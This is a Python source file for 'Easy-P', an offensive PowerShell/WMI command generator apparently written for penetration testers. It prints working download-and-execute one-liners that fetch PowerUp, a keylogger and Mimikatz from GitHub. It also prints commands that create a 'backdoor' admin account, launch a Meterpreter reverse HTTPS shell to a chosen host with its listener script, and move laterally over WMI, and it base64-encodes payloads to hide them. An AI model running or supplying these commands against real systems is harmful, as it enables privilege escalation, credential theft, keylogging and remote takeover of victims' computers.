#Powershell/WMI Generator aka Easy-P
#By Peter Kim
#Secure Planet LLC

#Import our modules
import base64
import sys
import re
import os
import getopt
import subprocess as sp

#Create a banner
def banner():
    print """
===========================================================
___________                              __________ 
\_   _____/____    _________.__.         \______    \ 
  |    __)_\__  \  /  ___<   |  |  ______  |     ___/
  |        \/ __ \_\___ \ \___  | /_____/  |    |    
 /_______  (____  /____  >/ ____|          |____|    
         \/     \/     \/ \/                         
Easy_P | A Powershell / WMI Command Generator.
Written by Peter Kim <Author, The Hacker Playbook>
                     <CEO, Secure Planet LLC>
===========================================================

    """
global run_execute
run_execute = "Powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('"

print "PowerShell/WMI Generator"

#Function to clear screen.
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def powershell_encode(data):
    #https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
    #Carlos - aka Darkoperator wrote the code below:
    # blank command will store our fixed unicode variable
    blank_command = ""
    powershell_command = ""
    # Remove weird chars that could have been added by ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # loop through each character and insert null byte
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assign powershell command as the new one
    powershell_command = blank_command
    # base64 encode the powershell command
    powershell_command = base64.b64encode(powershell_command)
    return powershell_command

def change_config():
    print ""
def location():
    pass

def priv():
    print """
Privilege Escalation:

[1] Search for vulnerable service privilege opportunities
[2] Abuse vulnerable service privilege opportunities
[3] Write-UserAddMSI
    """
    ans=raw_input("What would you like to do: ") 
    if ans == "1":
        clear()
        print "[*]Description: Search for vulnerable service privilege opportunities. Original: https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp"
        print "[*]Download from internet and execute:"
        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"
        print "\n[*]Run from a local copy of the script:"
        print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"'
        print "\n[*]Base64 encoded version download and execute:"
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks")
        print "powershell.exe -enc " + x
    
    if ans == "2":
        clear()
        print "[*]Description: Abuse vulnerable service privilege opportunities.  Original: https://github.com/Veil-Framework/PowerTools/tree/master/PowerUp" 
        ans_service = raw_input("Service Name: ") 
        print "[*]Download from internet and execute:"
        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName "+ans_service+" -UserName backdoor -Password password123 -Verbose"
        print "\n[*]Run from a local copy of the script:"
        print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Write-ServiceEXE -ServiceName '+ans_service+' -UserName backdoor -Password password123 -Verbose}"'
        print "\n[*]Base64 encoded version download and execute:"
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName  "+ans_service+" -UserName backdoor -Password password123 -Verbose")
        print "powershell.exe -enc " + x
    
    if ans == "3":
        clear()
        print "[*]Description: Write-UserAddMSI - If the AlwaysInstallElevated key is enabled for MSI files, Create an MSI to create local admin"
        print "[*]Download from internet and execute:"
        print run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI"
        print "\n[*]Run from a local copy of the script:"
        print 'powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Write-UserAddMSI}"'
        print "\n[*]Base64 encoded version download and execute:"
        x = powershell_encode(run_execute + "https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Write-UserAddMSI")
        print "powershell.exe -enc " + x

def key():
    clear()
    print "Keylogging:"
    print "[*]Description: Keylogger Saving Strokes to C:\Users\Public\key.log Original: https://github.com/mattifestation/PowerSploit"
    print "[*]Download from internet and execute:"
    print run_execute + "https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
    print "\n[*]Run from a local copy of the script:"
    print 'powershell.exe -exec bypass -Command "& {Import-Module .\Get-Keystrokes.ps1; Get-Keystrokes -LogPath C:\Users\Public\key.log}"'
    print "\n[*]Base64 encoded version download and execute:"
    x = powershell_encode(run_execute + "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log")
    print "powershell.exe -enc " + x
    
def lat():
    print """
Lateral Movement
-----------------------------------------------------
    
[1] Kerberos Golden Ticket Lateral Movement with WMI
[2] WMI Powershell Execution
-----------------------------------------------------
    """
    ans = raw_input("What would you like to do: ") 
    if ans == "1":
        clear()
        print 'wmic /authority:"Kerberos:[DOMAIN]\[HOSTNAME]" /node:[HOSTNAME] process call create "cmd /c [Command]"'
        print 'Example: wmic /authority:"Kerberos:hacker.testlab\win8" /node:win8 process call create "cmd /c ping 127.0.0.1 > C:\log.txt"'

    elif ans == "2":
        clear()
        print 'Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "powershell.exe -enc [Base64 encoded string]" -ComputerName [victim IP] -Credential [Username]'
        print 'For 32bit: wmic /USER:"" /PASSWORD:"" /NODE:[IP] process call create "powershell -enc [Base64 encoded string]"'
        print 'For 64bit: wmic /USER:"" /PASSWORD:"" /NODE:[IP] process call create "%WinDir%\syswow64\windowspowershell\\v1.0\powershell.exe -enc [Base64 encoded string]"'
        
def metasploit():
    print "[*]PowerShell Metasploit Meterpreter Reverse HTTPS Shell.  Original: https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1"
    ans_lhost = raw_input("LHOST: ") 
    ans_lport = raw_input("LPORT: ")
    clear() 
    print "[*]Download from internet and execute:"
    print "Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force"
    print "\n[*]Run from a local copy of the script:"
    print 'powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Shellcode.ps1; Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost '+ans_lhost+' -Lport '+ans_lport+' -Force}"'
    print "\n[*]Base64 encoded version download and execute:"
    x = powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "+ans_lhost+" -Lport "+ans_lport+" -Force")
    print "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + x
    print "\n[*]Listner Resource Script (listener.rc) - Save the following to a file called listener.rc on your Kali box and load your handler with msfconsole -r listener.rc"
    print "use multi/handler \nset payload windows/meterpreter/reverse_https \nset LHOST " + ans_lhost + "\nset LPORT " + ans_lport + "\nset ExitOnSession false \nexploit -j"

def p101():
    clear()
    print "Powershell Flags:"
    print "[*] -Exec Bypass : Bypass Security Execution Protection "
    print "[*] -NonI : Noninteractive Mode - PowerShell does not present an interactive prompt to the user "
    print "[*] -NoProfile : PowerShell console not to load the current user's profile"
    print "[*] -W Hidden : Sets the window style for the session"
    print "32bit Powershell Execution: powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
    print "64bit Powershell Execution: %WinDir%\syswow64\windowspowershell\\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass"
    print 'Permanently change a users execution policy: powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
    
    
ans = True
while ans:

    banner()
    print """
==Easy-P==
-----------------------------------------------------
[1] Privilege Escalation
[2] Lateral Movement
[3] Keylogging
[4] PowerShell Meterpreter
[5] Change Users Execution Policy
[6] Powershell 101
[7] Base64 Encode a PowerShell Script
[8] Mimikatz - Passwords from Memory
[99] Exit/Quit
-----------------------------------------------------
    """
    ans = int(raw_input("Select An Option: "))
    if ans == 1:
        priv()
    elif ans == 2:
        lat()
    elif ans == 3:
        key()
    elif ans == 4:
        metasploit()
    elif ans == 5:
        clear()
        print 'This will permanently change the current users execution policy:'
        print 'powershell -exec bypass -noninteractive -w hidden -Command "& {Set-ExecutionPolicy Unrestricted -Scope CurrentUser}"'
    elif ans == 6:
        p101()
    elif ans == 7:
        how = raw_input("1 - File, 2 - One liner: ")
        if how == "1":
            name = raw_input("full file path and file: ")
            with open(name,'r') as file_read:
                data=file_read.read()
            print "[*]Powershell.exe -NoP -Exec Bypass -enc " + powershell_encode(data)
        else:
            code = raw_input("PowerShell Script to Encode:")
            print code
            print "[*]Powershell.exe -NoP -Exec Bypass -enc " + powershell_encode(code)
 
    elif ans == 8:
        print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
        print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
    elif ans == 99:
        sys.exit(0)
